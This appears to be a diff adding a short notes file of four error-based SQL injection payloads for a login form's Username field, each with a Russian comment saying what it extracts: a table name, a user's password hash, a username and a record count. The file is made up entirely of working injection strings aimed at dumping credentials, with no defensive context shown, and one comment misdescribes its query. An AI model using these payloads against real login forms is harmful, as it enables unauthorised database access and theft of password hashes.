@@ -1,0 +1,15 @@
+Username=asd' AND (SELECT 6213 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM information_schema.tables LIMIT 183,1),0x71716a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Kyrd&Password=asd&submit=log
+
+Этот запрос вытаскивает имя таблицы из база данных test.
+
+Username=asd' AND (SELECT 7926 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT MID((IFNULL(CAST(hash AS CHAR),0x20)),1,54) FROM users_passwords LIMIT 4,1),0x71716a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jSTN&Password=asd&submit=log
+
+Этот запрос вытаскаивает хэш пользователя.
+
+Username=asd' AND (SELECT 3690 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT MID((IFNULL(CAST(users AS CHAR),0x20)),1,54) FROM users_passwords LIMIT 3,1),0x71716a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ANbG&Password=asd&submit=log
+
+Этот запрос вытаскивает имя пользователя.
+
+Username=asd' AND (SELECT 6182 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM users_passwords LIMIT 3,1),0x71716a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jecd&Password=asd&submit=log
+
+Этот запрос вытасквает кол-во записей в таблице.
